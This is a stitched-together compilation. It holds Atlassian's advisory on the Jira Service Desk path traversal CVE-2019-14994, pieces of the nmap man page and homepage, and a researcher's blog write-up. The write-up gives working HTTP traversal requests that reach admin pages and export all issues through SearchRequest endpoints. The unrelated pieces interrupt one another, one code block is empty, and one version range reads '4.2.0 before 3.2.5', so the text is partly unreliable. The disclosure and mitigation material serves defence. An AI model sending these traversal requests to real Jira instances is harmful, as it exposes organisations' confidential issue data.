### Description

A URL path traversal vulnerability in Jira Service Desk Server and Jira Service Desk Data Center allows a remote attacker with portal access to view all issues from all projects in the affected instance. This could include Jira Service Desk projects, Jira Core projects, and Jira Software projects. Note that when the [**Anyone can email the service desk or raise a request in the portal** setting](https://confluence.atlassian.com/servicedeskserver/managing-access-to-your-service-desk-939926273.html) is enabled, an attacker can grant themselves portal access, allowing them to exploit the vulnerability.

### Affected Versions

* All versions prior to 3.9.16
* Versions from 3.10.0 prior to 3.16.8
* Versions from 4.0.0 prior to 4.1.3
* Versions from 4.2.0 prior to 4.2.5
* Versions from 4.3.0 prior to 4.3.4
* Version 4.4.0

### Workaround

* Block requests to Jira containing .. at the reverse proxy or load balancer level
* Alternatively, configure Jira to redirect requests containing .. to a safe URL via urlrewrite.xml
  + Please see [Jira KB](https://confluence.atlassian.com/jirakb/migating-url-path-traversal-for-affected-cve-2019-14994-976762572.html) for workaround details
* [Restart Jira](https://confluence.atlassian.com/adminjiraserver/start-and-stop-jira-applications-938847802.html)

Refer to the [Jira KB](https://confluence.atlassian.com/jirakb/migating-url-path-traversal-for-affected-cve-2019-14994-976762572.html) for more information on these workarounds.

### Fix

**Note:** Upgrading Jira Service Desk also requires upgrading Jira Core. Check the [compatibility matrix](https://confluence.atlassian.com/adminjira/jira-applications-compatibility-matrix-875304597.html) to find the equivalent version for your Jira Service Desk version.

### **URL path traversal allows information disclosure - CVE-2019-14994**

#### **Severity**

Atlassian rates the severity level of this vulnerability as **critical**, according to the scale published in [our Atlassian severity levels](https://www.atlassian.com/security/security-severity-levels). The scale allows us to rank the severity as critical, high, moderate or low.

This is our assessment and you should evaluate its applicability to your own IT environment.

#### **Description**

By design, Jira Service Desk gives customer portal users permissions only to raise requests and view issues. This allows users to interact with the customer portal without having direct access to Jira. These restrictions can be bypassed by **any attacker with portal access\*** who exploits a path traversal vulnerability. Exploitation allows an attacker to view all issues within all Jira projects contained in the vulnerable instance. This could include Jira Service Desk projects, Jira Core projects, and Jira Software projects.

All versions of Jira Service Desk before 3.9.16, from 3.10.0 before 3.16.8, from 4.0.0 before 4.1.3, from 4.2.0 before 3.2.5, from 4.3.0 before 4.3.4, and 4.4.0 are affected by this vulnerability. This issue can be tracked here:
[JSDSERVER-6517](https://jira.atlassian.com/browse/JSDSERVER-6517)
-
Getting issue details...
STATUS

*\* Note that attackers can grant themselves access to Jira Service Desk portals that have the [Anyone can email the service desk or raise a request in the portal](https://confluence.atlassian.com/servicedeskserver/managing-access-to-your-service-desk-939926273.html)[setting](https://confluence.atlassian.com/servicedeskserver/managing-access-to-your-service-desk-939926273.html) enabled. Changing this permission does not remove the vulnerability to an exploit by an attacker that has portal access. Atlassian does not recommend changing the permission, instead please read-on and follow the instructions outline in the section: **What you need to do***

#### Acknowledgements

We would like to acknowledge [Sam Curry](https://twitter.com/samwcyo) for finding this vulnerability.

### **Fix**

We have released the following versions of Jira Service Desk Server & Jira Service Desk Data Center to address this issue:

* 4.4.1 which can be downloaded from <https://www.atlassian.com/software/jira/service-desk/update>
* 4.3.4 which can be downloaded from <https://www.atlassian.com/software/jira/service-desk/update>
* 4.2.5 which can be downloaded from <https://www.atlassian.com/software/jira/service-desk/update>
* 4.1.3 which can be downloaded from <https://www.atlassian.com/software/jira/service-desk/update>

* 3.9.16 which can be downloaded from <https://www.atlassian.com/software/jira/service-desk/update>

### ****What You Need to Do****

#### **Mitigation**

If you are unable to upgrade Jira Service Desk immediately or are in the process of [migrating to Jira Cloud](https://www.atlassian.com/cloud-migration), then as a **temporary workaround**, you can:

* [Block requests to JIRA containing `..` at the reverse proxy or load balance level](https://confluence.atlassian.com/jirakb/migating-url-path-traversal-for-affected-cve-2019-14994-976762572.html), or
* Alternatively, configure JIRA to redirect requests containing `..` to a safe URL
  + Add the following to the `<urlrewrite>` section of `[jira-installation-directory]/atlassian-jira/WEB-INF/urlrewrite.xml`:

    ```
        <rule>
            <from>^/[^?]*\.\..*$</from>
            <to type="temporary-redirect">/</to>
        </rule>
    ```
  + After saving the changes above, [restart Jira](https://confluence.atlassian.com/adminjiraserver/start-and-stop-jira-applications-938847802.html)

After upgrading Jira Service Desk this mitigation can be removed.

#### Upgrading Jira Service Desk

Atlassian recommends that you [upgrade to the latest version](https://confluence.atlassian.com/adminjiraserver/upgrading-jira-applications-938846936.html). For a full description of the latest version of Jira Service Desk Server & Jira Service Desk Data Center, see the [Release Notes](https://confluence.atlassian.com/servicedesk/jira-service-desk-release-notes-780083086.html).

## Name

nmap — Network exploration tool and security / port scanner

## Synopsis

`nmap` [
*`<Scan Type>`*
...] [
*`<Options>`*
] {
*`<target specification>`*
}

## Description

| [Note] | Note |
| --- | --- |
| This document describes the very latest version of Nmap available from [`https://nmap.org/download.html`](https://nmap.org/download.html) or [`https://nmap.org/dist/?C=M&O=D`](https://nmap.org/dist/?C=M&O=D). Please ensure you are using the latest version before reporting that a feature doesn't work as described. |

Nmap (“Network Mapper”) is an open source tool for network
exploration and security auditing. It was designed to rapidly
scan large networks, although it works fine against single
hosts. Nmap uses raw IP packets in novel ways to determine what
hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other
characteristics. While Nmap is commonly used for security audits,
many systems and network administrators find it useful for routine
tasks such as network inventory, managing service upgrade
schedules, and monitoring host or service uptime.

The output from Nmap is a list of scanned targets, with
supplemental information on each depending on the options
used. Key among that information is the “interesting ports
table”.
That table lists the port number and protocol,
service name, and state. The state is either
`open`, `filtered`,
`closed`, or `unfiltered`.
`Open`
means that an application on the target machine is listening for
connections/packets on that port.
`Filtered`
means that a firewall, filter, or other network
obstacle is blocking the port so that Nmap cannot tell whether it is
`open` or `closed`.
`Closed`
ports have no application listening on them,
though they could open up at any time.
Ports are classified as
`unfiltered`
when they are
responsive to Nmap's probes, but Nmap cannot determine whether they are
open or closed.
Nmap reports the state combinations
`open|filtered`
and `closed|filtered`
when it cannot determine which
of the two states describe a port. The port table may also
include software version details when version detection has been
requested. When an IP protocol scan is requested
(`-sO`), Nmap provides information on supported IP
protocols rather than listening ports.

In addition to the interesting ports table, Nmap can provide
further information on targets, including reverse DNS names,
operating system guesses, device types, and MAC addresses.

A typical Nmap scan is shown in [Example 15.1](man.html#man-ex-repscan "Example 15.1. A representative Nmap scan"). The only Nmap arguments used in
this example are `-A`, to enable OS and version
detection, script scanning, and traceroute; `-T4` for
faster execution; and then the hostname.

```

# Analysis of CVE-2019-14994 - Jira Service Desk Path Traversal leads to Massive Information Disclosure

Thu Sep 26 2019![Analysis of CVE-2019-14994 - Jira Service Desk Path Traversal leads to Massive Information Disclosure](/images/analysis-of-cve-2019-14994/jira_service_desk_photo.png)

Jira Service Desk is a help desk application that is built on top of core Jira. It allows customers to submit tickets that can be reviewed and managed by administrators.

There are two different portals within the service desk application:

* **Customer portal**
  + Primarily accessible under the **/servicedesk/** directory
* **Administrative portal**
  + Primarily accessible under the **/secure/** directory

The [CVE-2019-14994](https://confluence.atlassian.com/jira/jira-service-desk-security-advisory-2019-09-18-976171274.html) vulnerability allows an attacker, if able to access the customer portal, to traverse to the administrative portal and view issues within all Jira projects contained in the vulnerable instance. This could include Jira Service Desk projects, Jira Core projects, and Jira Software projects.

![](/_next/image?url=%2Fimages%2Fanalysis-of-cve-2019-14994%2Fjira_meme-1024x386.png&w=3840&q=75)

Photo showing both the customer and administration portals of Jira Service Desk

If an attacker can authenticate to submit support tickets (if the `*anyone can email the service desk or raise a request in the portal*` setting is enabled) on the following versions of Jira Service Desk, then the issue is exploitable:

* All versions **before** 3.9.16
* 3.10.x
* 3.11.x
* 3.12.x
* 3.13.x
* 3.14.x
* 3.15.x
* 3.16.x **before** 3.16.8 (the fixed version for 3.16.x)
* 4.0.x
* 4.1.x **before** 4.1.3 (the fixed version for 4.1.x)
* 4.2.x **before** 4.2.5 (the fixed version for 4.2.x)
* 4.3.x **before** 4.3.4 (the fixed version for 4.3.x)
* 4.4.0 **before** 4.4.1 (the fixed version for 4.4.x)

### Steps to Reproduce

The first thing to check for is whether or not the Jira instance is running service desk. You can do this by browsing to the following URL:

**<https://target.com/servicedesk/>**

If the directory exists then you'll be redirected to a login portal.

![](/_next/image?url=%2Fimages%2Fanalysis-of-cve-2019-14994%2Fjira_service_desk-1024x553.png&w=3840&q=75)

The URL you're redirected to after browsing to "/servicedesk/"

If the login portal exists, check if there is a "Sign up" button below the next button. If one exists then you can simply register and proceed, otherwise it is unexploitable unless you have access to an account with access to the customer portal.

Register using the "Sign up" button and login to the application.

![](/_next/image?url=%2Fimages%2Fanalysis-of-cve-2019-14994%2Fauthenticated.png&w=3840&q=75)

The customer portal after authenticating

The next step is to check whether or not the issue is exploitable by attempting to access the administrative portal as a customer.

Send the following HTTP request using a proxy such as Burp Suite (if you try sending this in your browser it will not work as the URL will normalize) after authenticating:

```
GET /servicedesk/customer/../../secure/BrowseProjects.jspa HTTP/1.1
Host: target.com
Cookie: [authenticated as a customer]

```

Note: depending on the Service Desk version, you may have to use the following notation to traverse:

```
GET /servicedesk/customer/..;/..;/secure/BrowseProjects.jspa HTTP/1.1

```

If the application is vulnerable, a broken "Browse Projects" page will be displayed:

![](/_next/image?url=%2Fimages%2Fanalysis-of-cve-2019-14994%2Faccess-1024x542.png&w=3840&q=75)

The administrative Jira Portal being accessed via directory traversal from the Customer portal

The above HTTP requests proves that, as a customer, you can access partial data from the administrative portal. Most functionality on the administrative portal is however done through APIs which handle the directory traversal characters strangely and make it hard to browse around the application normally.

The easiest way to exploit this vulnerability is to send the following HTTP request and export all of the organizations data:

```
GET /servicedesk/customer/../../sr/jira.issueviews:searchrequest-html-all-fields/temp/SearchRequest.html?jqlQuery=text+%7E+%22%22 HTTP/1.1
Host: target.com
Cookie: [authenticated as a customer]

```

If this endpoint returns "not found" but you were able to access the "/secure/BrowseProjects.jspa" endpoint, try browsing to the following URL instead:

```
GET /servicedesk/customer/../../sr/jira.issueviews:searchrequest-xml/temp/SearchRequest.xml?jqlQuery=text+%7E+%22%22 HTTP/1.1

```

The above HTTP request will return all of the data pertaining to the search term. You can use standard [JQL](https://confluence.atlassian.com/jirasoftwarecloud/advanced-searching-764478330.html) to query whatever you'd like or just replace the jqlQuery text parameter with text you'd like to search for.

![](/_next/image?url=%2Fimages%2Fanalysis-of-cve-2019-14994%2Fblurred-1024x431.png&w=3840&q=75)

The HTTP request an response for exporting an organizations data as HTML

### Addendum

One of the strange things about this is understanding how the authentication model works for Jira. Under normal circumstances, logging in as an employee and browsing to the above mentioned URLs (e.g. /secure/ and /sr/) will redirect you back to the customer dashboard.

It seems like this is their primary prevention to stop customers from accessing the administrative portal and is likely done by simply matching what URL they're browsed to and determining whether or not they should have access.

The fix that they suggested customers use is as follows:

```

The above patch is interesting because it only seems to address the "browsing to X gives you access" behavior. If an attacker were able to find a way, post fix, to browse directly to the administrative endpoints (e.g. encoding/fuzzing), they would probably be able to access the same functionality.

I found this vulnerability while attending the Atlassian Bug Bash hosted by Bugcrowd and was able to compromise Atlassian's core service desk for meant for Atlassian customers. They awarded the issue $10,000 with an $1,000 "stop testing" bonus.

This wasn't meant to be a super long blog post or deep-dive on how the vulnerability worked, but more of a simple explanation and proof of concept for the issue.

Huge thanks to...

and Data Center installations immediately to fix this vulnerability.

URL path traversal allows information disclosure - CVE-2019-14994

Severity:
Atlassian rates the severity level of this vulnerability as critical, according
to the scale published in our Atlassian severity levels. The scale allows us to
rank the severity as critical, high, moderate or low.
This is our assessment and you should evaluate its applicability to your own IT
environment.

Description:

By design, Jira Service Desk gives customer portal users permissions only to
raise requests and view issues. This allows users to interact with the customer
portal without having direct access to Jira. These restrictions can be bypassed
by a remote attacker with portal access who exploits a path traversal
vulnerability. Exploitation allows an attacker to view all issues
within all Jira
projects contained in the vulnerable instance. This could include Jira Service
Desk projects, Jira Core projects, and Jira Software projects.

Note that attackers can grant themselves access to Jira Service Desk
portals that
have the 'Anyone can email the service desk or raise a request in the portal'
setting enabled. Changing this setting does not defend against an attacker that
has portal access via other means. Atlassian does not recommend changing the
setting. Instead, upgrade to a non-vulnerable version listed below.

Versions of Jira Service Desk Server and Data Center before 3.9.16 (the fixed
version for 3.9.x), from version 3.10.0 before 3.16.8 (the fixed version for
3.16.x), from version 4.0.0 before 4.1.3 (the fixed version for 4.1.x), from
version 4.2.0 before 4.2.5 (the fixed version for 4.2.x), from version 4.3.0
before 4.3.4 (the fixed version for 4.3.x), and from version 4.4.0 before 4.4.1
(the fixed version for 4.4.x) are affected by this vulnerability. This issue can
be tracked at: <https://jira.atlassian.com/browse/JSDSERVER-6517>.

Fix:

To address this issue, we've released the following versions containing a fix:

* Jira Service Desk Server and Data Center version 3.9.16
* Jira Service Desk Server and Data Center version 3.16.8
* Jira Service Desk Server and Data Center version 4.1.3
* Jira Service Desk Server and Data Center version 4.2.5
* Jira Service Desk Server and Data Center version 4.3.4
* Jira Service Desk Server and Data Center version 4.4.1

Remediation:

Upgrade Jira Service Desk Server and Data Center to version 4.4.1 or higher.

The vulnerabilities and fix versions are described above. If affected, you
should upgrade to the latest version immediately.

If you are running Jira Service Desk Server and Data Center 3.9.x and cannot
upgrade to 4.4.1, upgrade to version 3.9.16.
If you are running Jira Service Desk Server and Data Center 3.16.x and cannot
upgrade to 4.4.1, upgrade to version 3.16.8.
If you are running Jira Service Desk Server and Data Center 4.1.x and cannot
upgrade to 4.4.1, upgrade to version 4.1.3.

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).
